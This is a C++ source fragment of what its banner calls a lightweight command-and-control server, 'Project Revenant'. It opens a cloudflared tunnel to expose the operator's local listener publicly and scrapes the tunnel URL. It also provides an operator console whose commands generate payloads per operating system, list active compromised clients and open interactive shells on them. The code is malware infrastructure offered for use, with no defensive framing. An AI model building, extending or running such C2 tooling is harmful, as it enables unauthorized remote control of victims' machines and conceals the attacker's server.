#include <iostream>
#include <cstdlib>
#include <unordered_map>
#include <memory>
#include <stdexcept>
#include <string>
#include <unistd.h>  // For sleep
#include <algorithm> // For std::remove
using namespace std;

int id = 0;

string start_cloudflared(int PORT) {
    // Start cloudflared and save its PID
    string command = "cloudflared tunnel --url http://localhost:" + to_string(PORT) + " > cloudflared.log 2>&1 & echo $! > cloudflared.pid";
    system(command.c_str());

    // Wait a few seconds for tunnel to come up
    sleep(6);

    // Use 'grep -ao' to avoid "binary file matches"
    FILE* pipe = popen("grep -ao 'https://[^ ]*trycloudflare.com' cloudflared.log | head -n1", "r");
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    char buffer[256];
    string result = "";

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);

    // Clean the result: remove \n and \r if present
    result.erase(remove(result.begin(), result.end(), '\n'), result.end());
    result.erase(remove(result.begin(), result.end(), '\r'), result.end());
    if(result.size()>0)
    cout << "Cloudflared URL: " << result << endl;
    else{
        cout<<"Cloudflared Failed, localhost is user"<<endl;
    }

    return result;
}

void stop_cloudflared() {
    // Kill the process using PID
    system("kill $(cat cloudflared.pid) 2>/dev/null");
    // Remove the PID file
    system("rm -f cloudflared.pid");
}

void help() {
    string output = "\n"
                    "generate os=<OS>\n"
                    "show shell\n"
                    "shell <shell-id>\n"
                    "help\n"
                    "exit\n\n";
    cout << output;
}

void banner() {
    cout << R"(

██████  ███████ ██    ██ ███████ ███    ██  █████  ███    ██ ████████ 
██   ██ ██      ██    ██ ██      ████   ██ ██   ██ ████   ██    ██    
██████  █████   ██    ██ █████   ██ ██  ██ ███████ ██ ██  ██    ██    
██   ██ ██      ██    ██ ██      ██  ██ ██ ██   ██ ██  ██ ██    ██    
██   ██ ███████  ██████  ███████ ██   ████ ██   ██ ██   ████    ██    
                                                                       

                Lightweight C2 Server - Project Revenant
------------------------------------------------------------------

)" << endl;
}

void show_shell(const unordered_map<string, int>& mp) {
    cout << "\n============================\n";
    cout << "   [+] Active Clients\n";
    cout << "============================\n";

    if (mp.empty()) {
        cout << "[!] No active clients.\n";
    } else {
        int count = 1;
        for (const auto& pair : mp) {
            cout << "[" << count << "] " << pair.first << "\n";
            count++;
        }
    }

    cout << "----------------------------\n";
    cout << "Usage: shell <Endpoint>\n";
    cout << "----------------------------\n\n";
}